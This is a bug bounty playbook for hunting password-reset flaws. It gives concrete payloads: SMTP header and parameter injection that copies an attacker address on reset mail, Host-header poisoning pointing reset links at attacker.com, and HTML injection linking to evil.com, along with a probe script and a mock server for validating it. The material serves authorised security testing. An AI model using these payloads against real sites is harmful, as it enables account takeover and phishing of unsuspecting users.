
# Password Reset Hunting

Bug bounty playbook for the account-recovery flow. Derived from real HackerOne reports. A reset flow is a goldmine because it crosses auth boundaries, sends email, and usually has weak state handling.

## When to use
- Target exposes `/forgot_password`, `/reset`, `/users/forgotten_password`, `/account/recover`, magic-link login, or email-change.
- You want a fast, ordered triage instead of randomly poking.

## The 8 vectors (ordered by hit rate)

### 1. Reset token never expires / reusable
The link stays valid after: (a) it was already used, (b) the password was changed, (c) the email was changed, (d) a **new** reset was requested (old token still works).
- Request reset → get link A. Request reset again → get link B. Does A still work after B is issued? Does A work after you change the password?
- Report as "password reset link not expiring" when any of the four hold.

### 2. Token leak via `Referer`
Reset page contains a link to an external resource (social, CDN, analytics, a help link). Clicking it sends the reset URL (with token) in the `Referer` header to the third party.
- Load the reset page, find any outbound link/asset that is third-party, check if the token is in the Referer.
- Variant: if the page loads third-party scripts, the token can leak in real time.

### 3. Token leak in the API response
The JSON/response that requests the reset includes the token or a full `resetPasswordLink`.
```json
{"status":"ok","resetPasswordLink":"https://site.com/reset?token=..."}
```
- If the client is not supposed to see the token (should only go to email), that's a finding. If it's a SPA, check the network tab on submit.

### 4. Email parameter manipulation
The reset request takes an `email` (or `user`) param. Try:
- **HPP**: `email=victim@x.com&email=attacker@x.com` — which one gets the mail?
- **Carbon-copy / newline injection**: `email=victim@x.com%0a%0dcc:attacker@x.com` (SMTP header injection → attacker CC'd on the victim's reset mail).
- **Separator injection**: `victim@x.com,attacker@x.com`, `victim@x.com%20attacker@x.com`, `victim@x.com|attacker@x.com`, `victim@x.com;attacker@x.com`.
- **JSON array**: `{"email":["victim@x.com","attacker@x.com"]}`.
- **XXE**: if the body is XML, inject an external entity to read a file / SSRF.
- Also try `{"email":"victim@x.com","email":"attacker@x.com"}` (duplicate key).

### 5. Host-header poisoning
The reset link is built from the `Host` / `X-Forwarded-Host` header instead of a fixed config value.
```
POST /forgot  Host: attacker.com   (or X-Forwarded-Host: attacker.com)
```
If the email link points to `attacker.com/reset?token=...`, the victim clicks it and the token lands on your server → ATO. Chain with #3 to capture.

### 6. No rate limiting
Fire N reset requests (Intruder null payload, or a bash loop). If no 429 / lockout, it's spam + brute-force surface. Low severity alone; chain with #7 for enumeration at scale.

### 7. User enumeration
Compare responses for a known-valid vs definitely-invalid email: status code, message text, response length, and **timing**. "If account exists we sent an email" vs "No account found" is the classic. Also check the reset endpoint itself and registration.

### 8. HTML / content injection in the reset email
Put markup in a field that lands in the email body (first name, company, display name):
`<a href="https://evil.com">Reset here</a>` or `<img src=x onerror=...>`.
If the email renders it, you control the mail the victim receives → convincing phishing with a legit sender. High impact when combined with a reset flow.

## Probe script
`scripts/reset_probe.sh` — passive-first triage: discovers reset endpoints, checks user enumeration, tests host-header injection, and rate-limit presence. Read the script before running; set `BASE` and `EMAIL`.

```bash
chmod +x scripts/reset_probe.sh
BASE=https://target.tld EMAIL=you@yourmail.tld ./scripts/reset_probe.sh
```

### Validate the probe against a local mock first
Never debug the probe against a live target — you'll fire real reset emails and trip rate limits / WAF while iterating. Stand up the mock, confirm the probe detects each planted flaw, then point it at the target.
```bash
python3 templates/mock_reset_server.py &            # listens on 127.0.0.1:8899
BASE=http://127.0.0.1:8899 EMAIL=me@x.tld KNOWN=real@target.tld ./scripts/reset_probe.sh
```
`templates/mock_reset_server.py` deliberately leaks the token in the response, reflects `X-Forwarded-Host` into the reset link, has no rate limit, and returns a different byte length for known vs unknown emails — so a correct probe run reports enumeration + host-header + no-rate-limit. If the probe finds nothing against the mock, the script is broken, not the target.

## Method (per target)
1. Capture the real reset request in Burp/devtools (endpoint, method, body, headers).
2. Walk vectors 1–8 in order; log each result with the raw request/response.
3. Anything that crosses into ATO (1, 2, 3, 4, 5) → escalate, build a full PoC.
4. Enumerate/rate-limit (6,7) → only report if they chain into something or the program accepts them.
5. Write up with raw request + response + impact.

## Pitfalls
- A reset link "still working" after one use is sometimes intentional (idempotent) — check the program's rules and the actual impact (can you reset *another* user's password with it?).
- Host-header poisoning only counts if the poisoned link actually reaches the victim's inbox with your host in it — prove it end-to-end.
- Don't spam a live target with thousands of requests; a handful proves the rate-limit point. Respect the program's rules.
- Email-param injection only matters if the mail is actually delivered to your address (or CC'd). Prove receipt.

## Reporting
Impact-first. "An attacker can take over any account by ..." Title formula: `[ATO] Password reset token leaked via <vector> on <endpoint>`. See the `report-writing` and `triage-validation` skills before submitting.
